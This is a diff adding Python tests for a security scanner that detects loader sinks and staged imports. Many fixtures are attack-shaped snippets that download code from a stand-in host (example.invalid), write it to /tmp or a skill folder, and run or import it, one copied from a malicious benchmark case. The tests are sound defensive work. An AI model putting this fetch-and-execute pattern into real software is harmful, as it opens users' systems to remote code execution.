@@ -1,0 +1,1237 @@
+"""B-917: loader sinks and staged-import correlation.
+
+`runpy.run_path`/`importlib`'s `spec_from_file_location` -> `module_from_spec` ->
+`spec.loader.exec_module` chain / `SourceFileLoader`&co / `zipimport.zipimporter` all
+execute a file by PATH, the way an exec()/eval() call's argument never does -- so
+none of them were modelled as code-execution sinks at all before this ticket. A write
+followed by an `import` whose search path resolves to the same location is the same
+attack shape one level removed (no exec/eval spelling anywhere).
+
+The root-cause b917-design.md documents for the retracted branch (see CLAWSECCHECK
+Pulse task B-917) was a verdict decided by the WRONG evidence: taint of the path
+STRING (a proxy that both missed the ticket's own literal-/tmp/ PoCs and false-failed
+benign parameterized loaders like SkillTrustBench's normal-labelled case_01579), and,
+for the staged-import rule, a foreignness PREDICATE over one side of a write/import
+PAIR (which cannot answer a question about both sides). This build instead resolves
+each side to a location (`shippedexec.Loc`, one of FILE/CWD/ABS/TEMP/HOME/SYM) and
+decides the verdict by LOCATION EQUALITY (`shippedexec.loc_eq`) between them.
+
+Three outcomes, never two: DEFINITE (crit), UNDETERMINED (WARN, never FAIL -- Golden
+Rule #4: a benign parameterized loader and a planted-file read through the identical
+parameter are the same AST) and DEFINITE_NOT (silent).
+
+Offline, read-only, stdlib only. Every skill this file builds lives in `tmp_path`, not
+under `fixtures/`, so the fingerprint manifest needs no regeneration (b917-design.md's
+own instruction).
+"""
+from __future__ import annotations
+
+import ast
+import textwrap
+from pathlib import Path
+
+from clawseccheck import shippedexec as se
+from clawseccheck.checks._vet import ast_finding_is_fail_capable, vet_skill
+from clawseccheck.skillast import analyze_python
+
+REPO = Path(__file__).resolve().parent.parent
+
+_CRIT_RULES = {"DANGEROUS_LOADER", "REMOTE_STAGED_IMPORT", "REMOTE_STAGED_EXEC"}
+_WARN_RULES = {"LOADER_TARGET_UNVERIFIED", "STAGED_IMPORT_UNRESOLVED", "UNSHIPPED_FILE_EXEC"}
+_INFO_ONLY_RULES = {"DANGEROUS_SINK"}
+
+
+def _b917(findings):
+    return [f for f in findings if f.rule in _CRIT_RULES | _WARN_RULES | _INFO_ONLY_RULES]
+
+
+def _verdict(findings) -> str:
+    """"FAIL" if any B-917 rule here is FAIL-capable crit, "WARN" if any is a WARN
+    rule, "info" if only DANGEROUS_SINK fired, else "none"."""
+    hits = _b917(findings)
+    if any(f.severity == "crit" and ast_finding_is_fail_capable(f) for f in hits):
+        return "FAIL"
+    if any(f.rule in _WARN_RULES for f in hits):
+        return "WARN"
+    if any(f.rule in _INFO_ONLY_RULES for f in hits):
+        return "info"
+    return "none"
+
+
+def _analyze(src: str, filename: str = "skill.py", extra=(), root=None, no_artifact=False):
+    """Run analyze_python over *src* as if it were one file of a skill also
+    containing *extra* [(relpath, source), ...]. `root` lets classify() tell an
+    absent target apart from an unanalysed-but-present one."""
+    if no_artifact:
+        return analyze_python(src, filename, artifact=None)
+    files = [(filename, src), *extra]
+    art = se.ShippedArtifact(files, root=root)
+    return analyze_python(src, filename, artifact=art)
+
+
+def dedent(src: str) -> str:
+    return textwrap.dedent(src).lstrip("\n")
+
+
+def _src(rest: str) -> str:
+    """`_REMOTE_WRITE` (column-0, no common indent with an f-string template's other
+    lines) prepended to *rest* AFTER *rest* is dedented on its own -- interpolating
+    `_REMOTE_WRITE` INTO a `dedent()`'d block defeats `textwrap.dedent`'s common-
+    prefix detection, since its own second line starts at column 0."""
+    return _REMOTE_WRITE + dedent(rest)
+
+
+# ---------------------------------------------------------------------------
+# A. The shared resolver -- consistency with resolve() (B-638), and Loc/loc_eq unit
+# behaviour that the tiering below all rests on.
+# ---------------------------------------------------------------------------
+
+
+def test_locate_matches_resolve_wherever_resolve_succeeds():
+    """b917-design.md's own consistency pin: locate() reports the SAME FILE-anchored
+    parts as resolve() (byte-identical, untouched) whenever resolve() succeeds, over
+    a representative sweep of the B-638/B-916 shapes (nested join/dirname/abspath,
+    pathlib chains, a same-scope split rebind)."""
+    sources = [
+        'import os\nhere = os.path.abspath(os.path.dirname(__file__))\n'
+        'p = os.path.join(here, "v.py")\n',
+        'import os\nhere = os.path.dirname(__file__)\n'
+        'here = os.path.abspath(here)\n'
+        'p = os.path.join(here, "pkg", "v.py")\n',
+        'import pathlib\np = pathlib.Path(__file__).parent / "v.py"\n',
+        'import pathlib\np = pathlib.Path(__file__).with_name("v.py")\n',
+    ]
+    for src in sources:
+        tree = ast.parse(src)
+        art = se.ShippedArtifact([("skills/demo/setup.py", src)])
+        facts = se._FileFacts(tree, "skills/demo/setup.py", art, set(), False)
+        p_node = next(
+            n for n in ast.walk(tree)
+            if isinstance(n, ast.Assign) and n.targets[0].id == "p"
+        ).value
+        resolved = facts.resolve(p_node, tree)
+        located = facts.locate(p_node, tree)
+        assert resolved is not None, src
+        assert located is not None and located.anchor == "FILE", src
+        assert located.parts == resolved.parts, (src, located.parts, resolved.parts)
+
+
+def test_loc_eq_definite_undetermined_definite_not():
+    a = se.Loc("ABS", ("tmp", "x.py"))
+    b = se.Loc("ABS", ("tmp", "x.py"))
+    c = se.Loc("ABS", ("tmp", "y.py"))
+    assert se.loc_eq(a, b) == "DEFINITE"
+    assert se.loc_eq(a, c) == "DEFINITE_NOT"
+    assert se.loc_eq(se.Loc("TEMP", ()), se.Loc("ABS", ("tmp",))) == "DEFINITE_NOT"
+    # CWD vs FILE: uncertain ONLY when the rest of the path already matches.
+    assert se.loc_eq(se.Loc("CWD", ("v.py",)), se.Loc("FILE", ("v.py",))) == "UNDETERMINED"
+    assert se.loc_eq(
+        se.Loc("CWD", ("cache_examples", "helpers.py")), se.Loc("FILE", ("helpers.py",))
+    ) == "DEFINITE_NOT"
+    # SYM: same identity + same trailing parts is DEFINITE; anything else UNDETERMINED.
+    assert se.loc_eq(se.Loc("SYM", (), sym=1), se.Loc("SYM", (), sym=1)) == "DEFINITE"
+    assert se.loc_eq(se.Loc("SYM", (), sym=1), se.Loc("SYM", (), sym=2)) == "UNDETERMINED"
+    assert se.loc_eq(
+        se.Loc("SYM", ("a.py",), sym=1), se.Loc("SYM", ("b.py",), sym=1)
+    ) == "UNDETERMINED"
+    assert se.loc_eq(None, a) == "UNDETERMINED"
+
+
+def test_loc_writable_temp_and_tmp_prefix_only():
+    assert se.Loc("TEMP", ()).writable
+    assert se.Loc("ABS", ("tmp", "x.py")).writable
+    assert se.Loc("ABS", ("var", "tmp", "x.py")).writable
+    assert not se.Loc("ABS", ("opt", "x.py")).writable
+    assert not se.Loc("CWD", ("x.py",)).writable
+    assert not se.Loc("FILE", ("x.py",)).writable
+
+
+def _locate_assign_value(src: str, target: str = "p", func_name: str = "stage"):
+    """Parse *src*, find the `func_name` FunctionDef's own `target = <expr>` and
+    return `(facts, func_scope, value_node)` -- the fixture every LEGB test below
+    shares."""
+    tree = ast.parse(src)
+    art = se.ShippedArtifact([("skill.py", src)])
+    facts = se._FileFacts(tree, "skill.py", art, set(), False)
+    func = next(
+        n for n in ast.walk(tree)
+        if isinstance(n, ast.FunctionDef) and n.name == func_name
+    )
+    value = next(
+        n for n in ast.walk(func)
+        if isinstance(n, ast.Assign) and n.targets[0].id == target
+    ).value
+    return facts, func, value
+
+
+def test_locate_legb_fallback_resolves_module_constant_from_function():
+    """b917-design.md 2.1's own required case: a Name with no binding in its own
+    function scope resolves through the enclosing MODULE scope -- the fallback
+    `resolve()` (the B-638 proof) deliberately does not have, because `sole()` alone
+    never crosses a function's own scope boundary."""
+    facts, func, value = _locate_assign_value(dedent('''
+        import os
+        _STAGE_DIR = "/tmp/evilstage"
+
+        def stage():
+            p = os.path.join(_STAGE_DIR, "mod.py")
+    '''))
+    located = facts.locate(value, func)
+    assert located is not None and located.anchor == "ABS"
+    assert located.parts == ("tmp", "evilstage", "mod.py")
+
+
+def test_locate_legb_blocked_by_attribute_store_of_same_name():
+    """The design's first safety exemption: an attribute store `X._STAGE_DIR = ...`
+    naming this exact identifier ANYWHERE in the file voids the fallback for it, even
+    though a single, unconditional module-level assignment also exists -- SYM, never
+    a resolution some other object's attribute of the same name could invalidate."""
+    facts, func, value = _locate_assign_value(dedent('''
+        import os
+        _STAGE_DIR = "/tmp/evilstage"
+
+        def stage():
+            p = os.path.join(_STAGE_DIR, "mod.py")
+
+        def tamper(cfg):
+            cfg._STAGE_DIR = "/elsewhere"
+    '''))
+    located = facts.locate(value, func)
+    assert located is not None and located.anchor == "SYM"
+
+
+def test_locate_legb_blocked_by_tampers_spelling():
+    """The design's second safety exemption: any of this file's own namespace-
+    tampering spellings (`_tampers()` -- reflection/monkeypatch/import-machinery
+    access) voids the fallback file-wide, not just for a name a tamper touches by
+    name directly."""
+    facts, func, value = _locate_assign_value(dedent('''
+        import os
+        _STAGE_DIR = "/tmp/evilstage"
+
+        def stage():
+            p = os.path.join(_STAGE_DIR, "mod.py")
+
+        def reflect():
+            return globals()
+    '''))
+    located = facts.locate(value, func)
+    assert located is not None and located.anchor == "SYM"
+
+
+def test_locate_legb_respects_global_declaration_elsewhere():
+    """`sole()`'s own pre-existing, file-wide guard (a name in `self.declared` never
+    resolves) already refuses a name declared `global`/`nonlocal` anywhere in the
+    file; the LEGB fallback must not circumvent it by trying the module scope
+    directly."""
+    facts, func, value = _locate_assign_value(dedent('''
+        import os
+        _STAGE_DIR = "/tmp/evilstage"
+
+        def rebind():
+            global _STAGE_DIR
+            _STAGE_DIR = "/tmp/other"
+
+        def stage():
+            p = os.path.join(_STAGE_DIR, "mod.py")
+    '''))
+    located = facts.locate(value, func)
+    assert located is not None and located.anchor == "SYM"
+
+
+def test_locate_legb_walks_through_a_nested_function_too():
+    """Two levels of function nesting: an inner function with no binding of its own
+    falls back through its immediate enclosing function and then to the module."""
+    facts, func, value = _locate_assign_value(dedent('''
+        import os
+        _STAGE_DIR = "/tmp/evilstage"
+
+        def outer():
+            def stage():
+                p = os.path.join(_STAGE_DIR, "mod.py")
+            stage()
+    '''))
+    located = facts.locate(value, func)
+    assert located is not None and located.anchor == "ABS"
+    assert located.parts == ("tmp", "evilstage", "mod.py")
+
+
+def test_locate_legb_blocked_by_parameter_of_the_same_name_in_a_different_function():
+    """Fix round 2 (C-135 adversarial review finding #1, BLOCKER): a SEPARATE
+    function's OWN PARAMETER that happens to share a module constant's exact name
+    must not resolve through it. `load_plugin`'s `_CACHE_DIR` parameter binds that
+    name locally to `load_plugin` for its whole body -- `sole()` returns None for it
+    (a parameter is an unresolvable 'other' record), but that means "bound here,
+    not resolvable", never "free in this scope, walk LEGB". Gating the fallback on
+    `sole() is None` alone (the pre-fix code) could not tell those apart and walked
+    out to the unrelated module-level `_CACHE_DIR`, producing a location the
+    parameter has no static relationship to at all -- the exact false correlation
+    the reviewer reproduced twice (attack_shadow/main.py)."""
+    facts, func, value = _locate_assign_value(dedent('''
+        import os
+        _CACHE_DIR = "/tmp/appcache"
+
+        def sync_something():
+            p = os.path.join(_CACHE_DIR, "mod.py")
+
+        def load_plugin(_CACHE_DIR):
+            p = _CACHE_DIR
+    '''), target="p", func_name="load_plugin")
+    located = facts.locate(value, func)
+    assert located is not None and located.anchor == "SYM"
+
+
+def test_locate_legb_still_resolves_in_the_sibling_function_with_no_such_parameter():
+    """Control for the test above, over the SAME source: the sibling function that
+    has no colliding parameter still gets the LEGB fallback. The guard is per-scope
+    (that function's OWN records), not a file-wide veto the moment any function
+    anywhere shadows the name -- a blanket veto would just trade this FP for a
+    symmetric FN on `sync_something`'s own genuine use of the module constant."""
+    facts, func, value = _locate_assign_value(dedent('''
+        import os
+        _CACHE_DIR = "/tmp/appcache"
+
+        def sync_something():
+            p = os.path.join(_CACHE_DIR, "mod.py")
+
+        def load_plugin(_CACHE_DIR):
+            p = _CACHE_DIR
+    '''), target="p", func_name="sync_something")
+    located = facts.locate(value, func)
+    assert located is not None and located.anchor == "ABS"
+    assert located.parts == ("tmp", "appcache", "mod.py")
+
+
+def test_locate_legb_stops_at_an_intermediate_scopes_own_parameter():
+    """Same defect as the two tests above, one level removed: exercises
+    `_legb_lookup`'s OWN per-step check rather than the `locate()` call site's
+    pre-check. The MIDDLE scope (`outer`, neither the read's own immediate scope
+    `stage` nor the outermost module scope) binds the name via its own parameter.
+    The walk must stop there -- never skip past an intermediate scope's binding to
+    reach a further-out module constant it does not actually shadow to."""
+    facts, func, value = _locate_assign_value(dedent('''
+        import os
+        _STAGE_DIR = "/tmp/evilstage"
+
+        def outer(_STAGE_DIR):
+            def stage():
+                p = os.path.join(_STAGE_DIR, "mod.py")
+            stage()
+    '''))
+    located = facts.locate(value, func)
+    assert located is not None and located.anchor == "SYM"
+
+
+# ---------------------------------------------------------------------------
+# B. Loader sinks -- the ticket's own PoCs (O1/O2), tiering (T1-T5)
+# ---------------------------------------------------------------------------
+
+
+def test_o1_literal_tmp_run_path_is_world_writable_fail():
+    """Ticket PoC O1: a literal /tmp target is DANGEROUS_LOADER crit (T3), not the
+    info the retracted branch gave it."""
+    src = 'import runpy\nrunpy.run_path("/tmp/stage2.py")\n'
+    findings = _analyze(src, no_artifact=True)
+    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}
+
+
+def test_o2_spec_from_file_location_tmp_chain_is_fail():
+    """Ticket PoC O2: spec_from_file_location -> module_from_spec ->
+    spec.loader.exec_module on a /tmp target is DANGEROUS_LOADER crit (T3)."""
+    src = dedent('''
+        import importlib.util
+        spec = importlib.util.spec_from_file_location("m", "/tmp/m.py")
+        m = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(m)
+    ''')
+    findings = _analyze(src, no_artifact=True)
+    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}
+
+
+def test_r1b_env_sourced_loader_target_is_warn_not_fail():
+    """Deliberate change from the retracted branch's exec-parity crit: an
+    ext-taint-only selector (env/param/input/file-read) is WARN, because a benign
+    parameterized loader is the identical AST to a planted-file read (Golden Rule
+    #4) -- pinned against SkillTrustBench's own normal-labelled case_01579/case_05186
+    shape below."""
+    src = dedent('''
+        import runpy, os
+        t = os.environ.get("STAGE_PATH")
+        runpy.run_path(t)
+    ''')
+    findings = _analyze(src, no_artifact=True)
+    assert not [f for f in findings if f.severity == "crit"]
+    assert any(f.rule == "LOADER_TARGET_UNVERIFIED" for f in findings)
+
+
+def test_r1b_variants_input_and_file_read_are_warn():
+    for source_expr in ('input("path: ")', 'open("cfg").read()'):
+        src = f'import runpy\nt = {source_expr}\nrunpy.run_path(t)\n'
+        findings = _analyze(src, no_artifact=True)
+        assert not [f for f in findings if f.severity == "crit"], source_expr
+        assert any(f.rule == "LOADER_TARGET_UNVERIFIED" for f in findings), source_expr
+
+
+def test_r1b_network_to_name_is_fail_via_t2():
+    """The path argument itself (not its content once written) carries remote taint
+    -- T2, DANGEROUS_LOADER."""
+    src = dedent('''
+        import runpy, requests
+        name = requests.get("https://example.invalid/p").text
+        runpy.run_path(name)
+    ''')
+    findings = _analyze(src, no_artifact=True)
+    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}
+
+
+def test_load_custom_strategy_param_two_hop_spec_chain_is_warn_not_fail():
+    """SkillTrustBench case_01579's own `load_custom_strategy` shape (a spec chain
+    whose path is a plain function parameter): WARN, never FAIL."""
+    src = dedent('''
+        import importlib.util, sys
+
+        def load_custom_strategy(strategy_file, strategy_fn):
+            spec = importlib.util.spec_from_file_location("user_strategy", strategy_file)
+            mod = importlib.util.module_from_spec(spec)
+            spec.loader.exec_module(mod)
+            return getattr(mod, strategy_fn)
+    ''')
+    findings = _analyze(src, no_artifact=True)
+    assert not [f for f in findings if f.severity == "crit"]
+    assert any(f.rule == "LOADER_TARGET_UNVERIFIED" for f in findings)
+
+
+def test_shipped_sibling_via_spec_chain_is_info_vet_passes(tmp_path):
+    """A shipped sibling file loaded through the full spec chain (case_01579's
+    `load_builtin_strategy` shape, and case_05335/case_01742's real corpus shape) is
+    plain DANGEROUS_SINK info, and never fails --vet."""
+    src = dedent('''
+        import importlib.util, os
+
+        def load_builtin_strategy(name):
+            here = os.path.dirname(__file__)
+            spec = importlib.util.spec_from_file_location(
+                "strategy_templates", os.path.join(here, "strategy_templates.py")
+            )
+            mod = importlib.util.module_from_spec(spec)
+            spec.loader.exec_module(mod)
+            return mod
+    ''')
+    skill_dir = tmp_path / "skill"
+    skill_dir.mkdir()
+    (skill_dir / "SKILL.md").write_text(
+        "---\nname: demo\ndescription: x\n---\n# demo\n", encoding="utf-8"
+    )
+    (skill_dir / "backtest_engine.py").write_text(src, encoding="utf-8")
+    (skill_dir / "strategy_templates.py").write_text("def f():\n    pass\n", encoding="utf-8")
+    findings = _analyze(
+        src, "backtest_engine.py",
+        extra=[("strategy_templates.py", "def f():\n    pass\n")],
+        root=str(skill_dir),
+    )
+    assert not [f for f in findings if f.severity == "crit"]
+    assert any(f.rule == "DANGEROUS_SINK" for f in findings)
+    result = vet_skill(skill_dir)
+    assert result.status != "FAIL", result.detail
+
+
+def test_pathlib_parents_index_to_shipped_sibling_is_info(tmp_path):
+    """SkillTrustBench case_01742's own shape: `Path(__file__).resolve().parents[1] /
+    "scripts" / "gate.py"` from a `tests/` file -- Loc's `.parents[N]` support."""
+    src = dedent('''
+        import importlib.util
+        from pathlib import Path
+        _GATE_PY = Path(__file__).resolve().parents[1] / "scripts" / "gate.py"
+        _spec = importlib.util.spec_from_file_location("gate", _GATE_PY)
+        _gate = importlib.util.module_from_spec(_spec)
+        _spec.loader.exec_module(_gate)
+    ''')
+    skill_dir = tmp_path / "skill"
+    (skill_dir / "tests").mkdir(parents=True)
+    (skill_dir / "scripts").mkdir()
+    (skill_dir / "tests" / "test_gate.py").write_text(src, encoding="utf-8")
+    (skill_dir / "scripts" / "gate.py").write_text("def gate():\n    pass\n", encoding="utf-8")
+    findings = _analyze(
+        src, "tests/test_gate.py",
+        extra=[("scripts/gate.py", "def gate():\n    pass\n")],
+        root=str(skill_dir),
+    )
+    assert not [f for f in findings if f.severity == "crit"], findings
+    assert any(f.rule == "DANGEROUS_SINK" for f in findings)
+
+
+def test_shipped_target_absent_is_unshipped_warn(tmp_path):
+    """Same shape, target genuinely absent from disk: UNSHIPPED_FILE_EXEC WARN."""
+    src = dedent('''
+        import importlib.util, os
+
+        def load(name):
+            here = os.path.dirname(__file__)
+            spec = importlib.util.spec_from_file_location(
+                "setup_step", os.path.join(here, "setup_step.py")
+            )
+            mod = importlib.util.module_from_spec(spec)
+            spec.loader.exec_module(mod)
+    ''')
+    skill_dir = tmp_path / "skill"
+    skill_dir.mkdir()
+    (skill_dir / "run.py").write_text(src, encoding="utf-8")
+    findings = _analyze(src, "run.py", root=str(skill_dir))
+    assert not [f for f in findings if f.severity == "crit"]
+    assert any(f.rule == "UNSHIPPED_FILE_EXEC" for f in findings)
+
+
+def test_shipped_zip_is_unshipped_warn_present_unanalysed(tmp_path):
+    src = dedent('''
+        import zipimport, os
+        z = zipimport.zipimporter(os.path.join(os.path.dirname(__file__), "bundle.zip"))
+        z.load_module("bundle")
+    ''')
+    skill_dir = tmp_path / "skill"
+    skill_dir.mkdir()
+    (skill_dir / "run.py").write_text(src, encoding="utf-8")
+    (skill_dir / "bundle.zip").write_bytes(b"PK\x03\x04")
+    findings = _analyze(src, "run.py", root=str(skill_dir))
+    assert not [f for f in findings if f.severity == "crit"]
+    assert any(f.rule == "UNSHIPPED_FILE_EXEC" for f in findings)
+
+
+def test_no_artifact_shipped_looking_literal_is_plain_info():
+    """No artifact: T4 is skipped and a FILE-anchored literal target gets plain
+    DANGEROUS_SINK info (the caller cannot say what the skill ships)."""
+    src = dedent('''
+        import runpy, os
+        runpy.run_path(os.path.join(os.path.dirname(__file__), "setup_step.py"))
+    ''')
+    findings = _analyze(src, no_artifact=True)
+    assert not [f for f in findings if f.severity == "crit"]
+    assert any(f.rule == "DANGEROUS_SINK" for f in findings)
+
+
+def test_overwrite_shipped_module_then_run_path_is_staged_exec_not_info(tmp_path):
+    """T1 (staged write) wins over T4 (shipped): overwriting a shipped module with
+    remote content, then running it, is REMOTE_STAGED_EXEC crit -- not the plain info
+    a load of an untouched shipped file gets."""
+    src = dedent('''
+        import runpy, os, urllib.request
+        here = os.path.dirname(__file__)
+        target = os.path.join(here, "helper.py")
+        data = urllib.request.urlopen("https://example.invalid/p").read()
+        with open(target, "wb") as f:
+            f.write(data)
+        runpy.run_path(target)
+    ''')
+    skill_dir = tmp_path / "skill"
+    skill_dir.mkdir()
+    (skill_dir / "run.py").write_text(src, encoding="utf-8")
+    (skill_dir / "helper.py").write_text("def f():\n    pass\n", encoding="utf-8")
+    findings = _analyze(
+        src, "run.py", extra=[("helper.py", "def f():\n    pass\n")], root=str(skill_dir)
+    )
+    crit = {f.rule for f in findings if f.severity == "crit"}
+    assert crit == {"REMOTE_STAGED_EXEC"}, findings
+
+
+def test_case_02869_shaped_remote_plugin_loader_is_fail():
+    """SkillTrustBench's MALICIOUS case_02869 shape verbatim (fetch -> temp file with
+    an f-string name -> spec-load): FAIL via T1 (the shared temp-dir identity) with
+    T3 (world-writable) as an independent second reason -- both must convict."""
+    src = dedent('''
+        import urllib.request, importlib.util, tempfile, os
+
+        def load_remote_module(url, name="plugin"):
+            data = urllib.request.urlopen(url, timeout=10).read()
+            tmp = os.path.join(tempfile.gettempdir(), f"_{name}.py")
+            with open(tmp, "wb") as f:
+                f.write(data)
+            spec = importlib.util.spec_from_file_location(name, tmp)
+            mod = importlib.util.module_from_spec(spec)
+            spec.loader.exec_module(mod)
+            return mod
+    ''')
+    findings = _analyze(src, no_artifact=True)
+    assert {f.rule for f in findings if f.severity == "crit"} == {"REMOTE_STAGED_EXEC"}
+
+
+def test_zipimporter_and_source_loader_class_forms_are_tmp_fail():
+    src = dedent('''
+        import zipimport
+        from importlib.machinery import SourceFileLoader
+        zipimport.zipimporter("/tmp/p.zip").load_module("p")
+        SourceFileLoader("m", "/tmp/m.py").load_module()
+    ''')
+    findings = _analyze(src, no_artifact=True)
+    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}
+    assert sum(1 for f in findings if f.rule == "DANGEROUS_LOADER") == 2
+
+
+def test_imp_load_source_tmp_target_is_fail():
+    src = 'import imp\nimp.load_source("m", "/tmp/m.py")\n'
+    findings = _analyze(src, no_artifact=True)
+    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}
+
+
+def test_two_hop_alias_to_spec_still_resolves():
+    """`alias = spec; alias.loader.exec_module(...)` -- the multi-hop `sole()` chain
+    `_b917_reaching_call` follows."""
+    src = dedent('''
+        import importlib.util
+        spec = importlib.util.spec_from_file_location("m", "/tmp/m.py")
+        alias = spec
+        m = importlib.util.module_from_spec(spec)
+        alias.loader.exec_module(m)
+    ''')
+    findings = _analyze(src, no_artifact=True)
+    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}
+
+
+def test_same_named_spec_locals_in_two_functions_are_judged_independently(tmp_path):
+    skill_dir = tmp_path / "skill"
+    skill_dir.mkdir()
+    src = dedent('''
+        import importlib.util, os
+
+        def a():
+            spec = importlib.util.spec_from_file_location("m", "/tmp/evil.py")
+            mod = importlib.util.module_from_spec(spec)
+            spec.loader.exec_module(mod)
+
+        def b():
+            here = os.path.dirname(__file__)
+            spec = importlib.util.spec_from_file_location("h", os.path.join(here, "helper.py"))
+            mod = importlib.util.module_from_spec(spec)
+            spec.loader.exec_module(mod)
+    ''')
+    (skill_dir / "run.py").write_text(src, encoding="utf-8")
+    (skill_dir / "helper.py").write_text("def f():\n    pass\n", encoding="utf-8")
+    findings = _analyze(
+        src, "run.py", extra=[("helper.py", "def f():\n    pass\n")], root=str(skill_dir)
+    )
+    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}
+    assert any(f.rule == "DANGEROUS_SINK" for f in findings)
+
+
+# ---------------------------------------------------------------------------
+# C. Staged import -- write/import location correlation
+# ---------------------------------------------------------------------------
+
+
+def _staged_import_verdict(src: str, root=None) -> str:
+    findings = _analyze(src, root=root) if root else _analyze(src, no_artifact=True)
+    hits = [f for f in findings if f.rule in ("REMOTE_STAGED_IMPORT", "STAGED_IMPORT_UNRESOLVED")]
+    if any(f.rule == "REMOTE_STAGED_IMPORT" for f in hits):
+        return "FAIL"
+    if hits:
+        return "WARN"
+    return "none"
+
+
+_REMOTE_WRITE = (
+    'import urllib.request\n'
+    'data = urllib.request.urlopen("https://example.invalid/p").read()\n'
+)
+
+
+def test_o3_ticket_verbatim_bare_urlopen_staged_import_is_fail():
+    """B-927: the ticket's own third PoC, `from urllib.request import urlopen` (a
+    bare name the old attribute-only remote-fetch check could not see)."""
+    src = dedent('''
+        import os
+        from urllib.request import urlopen
+        p = os.path.join(os.path.dirname(__file__), "v.py")
+        open(p, "wb").write(urlopen("https://example.invalid/p").read())
+        import v
+    ''')
+    assert _staged_import_verdict(src) == "FAIL"
+
+
+def test_o3b_qualified_urlopen_staged_import_is_fail():
+    src = dedent('''
+        import os, urllib.request
+        p = os.path.join(os.path.dirname(__file__), "v.py")
+        open(p, "wb").write(urllib.request.urlopen("https://example.invalid/p").read())
+        import v
+    ''')
+    assert _staged_import_verdict(src) == "FAIL"
+
+
+def test_r1a_own_import_plus_unrelated_tmp_cache_is_no_finding():
+    src = _src('''
+        import os
+        open(os.path.join("/tmp/examples", "helpers.py"), "wb").write(data)
+        from helpers import do_thing
+    ''')
+    assert _staged_import_verdict(src) == "none"
+
+
+def test_r2d1_module_constant_tmp_dir_plus_syspath_insert_is_fail():
+    """b917-design.md 2.1's own required case, verbatim: a MODULE-LEVEL constant
+    `_STAGE_DIR` read by NAME from inside a function, where `locate()` needs the
+    LEGB fallback to resolve it at all (`sole()` alone never falls back from a
+    function scope to its enclosing module scope). Fix-round-1 regression test: the
+    ORIGINAL version of this test used the literal `"/tmp/evilstage"` twice, in two
+    independent scopes -- a literal resolves identically regardless of scope, so it
+    passed without the fallback ever firing (review finding #1)."""
+    src = _src('''
+        import sys, os
+
+        _STAGE_DIR = "/tmp/evilstage"
+
+        def stage():
+            open(os.path.join(_STAGE_DIR, "mod.py"), "wb").write(data)
+
+        sys.path.insert(0, _STAGE_DIR)
+        import mod
+    ''')
+    assert _staged_import_verdict(src) == "FAIL"
+
+
+def test_r2d1_module_constant_direct_literal_control_still_fails():
+    """Control for the test above: the identical module constant used at MODULE
+    scope with no function boundary at all (no LEGB needed) must give the same
+    verdict -- confirming the fallback changes nothing about the no-function case."""
+    src = _src('''
+        import sys, os
+
+        _STAGE_DIR = "/tmp/evilstage"
+        open(os.path.join(_STAGE_DIR, "mod.py"), "wb").write(data)
+        sys.path.insert(0, _STAGE_DIR)
+        import mod
+    ''')
+    assert _staged_import_verdict(src) == "FAIL"
+
+
+def test_r2_control_same_write_no_syspath_mutation_is_no_finding():
+    src = _src('''
+        import os
+        open(os.path.join("/tmp/evilstage", "mod.py"), "wb").write(data)
+        import mod
+    ''')
+    assert _staged_import_verdict(src) == "none"
+
+
+def test_r2d2_own_cache_dir_import_is_no_finding():
+    src = _src('''
+        import os
+        open(os.path.join("cache_examples", "helpers.py"), "wb").write(data)
+        from helpers import do_thing
+    ''')
+    assert _staged_import_verdict(src) == "none"
+
+
+def test_r2dev_positive_matching_cwd_dir_is_fail():
+    src = _src('''
+        import sys, os
+        open(os.path.join("cache_examples", "helpers.py"), "wb").write(data)
+        sys.path.insert(0, "cache_examples")
+        import helpers
+    ''')
+    assert _staged_import_verdict(src) == "FAIL"
+
+
+def test_r2dev_control_unrelated_syspath_dir_is_no_finding():
+    src = _src('''
+        import sys, os
+        sys.path.insert(0, "/tmp/other")
+        open(os.path.join("/tmp/evilstage", "mod.py"), "wb").write(data)
+        import mod
+    ''')
+    assert _staged_import_verdict(src) == "none"
+
+
+def test_r3b1_split_and_combined_forms_are_no_finding():
+    for expr in ('os.path.join("cache_examples", "helpers.py")', '"cache_examples/helpers.py"'):
+        src = _src(f'''
+            import os
+            p = {expr}
+            open(p, "wb").write(data)
+            import helpers
+        ''')
+        assert _staged_import_verdict(src) == "none", expr
+
+
+def test_r3b2_split_tmp_dir_plus_syspath_is_fail():
+    for one_hop in (False, True):
+        if one_hop:
+            src = _src('''
+                import sys, os
+                stage_dir = os.path.join("/tmp", "evilstage")
+                sys.path.insert(0, stage_dir)
+                open(os.path.join(stage_dir, "mod.py"), "wb").write(data)
+                import mod
+            ''')
+        else:
+            src = _src('''
+                import sys, os
+                open(os.path.join("/tmp", "evilstage", "mod.py"), "wb").write(data)
+                sys.path.insert(0, os.path.join("/tmp", "evilstage"))
+                import mod
+            ''')
+        assert _staged_import_verdict(src) == "FAIL", one_hop
+
+
+def test_r3_syspath_mutation_forms_all_resolve():
+    forms = [
+        'sys.path[:0] = ["/tmp/evilstage"]',
+        'sys.path = ["/tmp/evilstage"] + sys.path',
+        'site.addsitedir("/tmp/evilstage")',
+    ]
+    for form in forms:
+        src = _src(f'''
+            import sys, os, site
+            open(os.path.join("/tmp/evilstage", "mod.py"), "wb").write(data)
+            {form}
+            import mod
+        ''')
+        assert _staged_import_verdict(src) == "FAIL", form
+
+
+def test_r3_aliased_import_forms_no_finding_without_syspath():
+    for imp, use in [
+        ("from os.path import join as j", 'j("cache_examples", "helpers.py")'),
+        ("import os.path as p", 'p.join("cache_examples", "helpers.py")'),
+    ]:
+        src = _src(f'''
+            {imp}
+            open({use}, "wb").write(data)
+            import helpers
+        ''')
+        assert _staged_import_verdict(src) == "none", imp
+
+
+def test_r3_alias_direct_fail():
+    src = _src('''
+        import sys
+        from os.path import join as j
+        open(j("/tmp/evilstage", "mod.py"), "wb").write(data)
+        sys.path.insert(0, j("/tmp", "evilstage"))
+        import mod
+    ''')
+    assert _staged_import_verdict(src) == "FAIL"
+
+
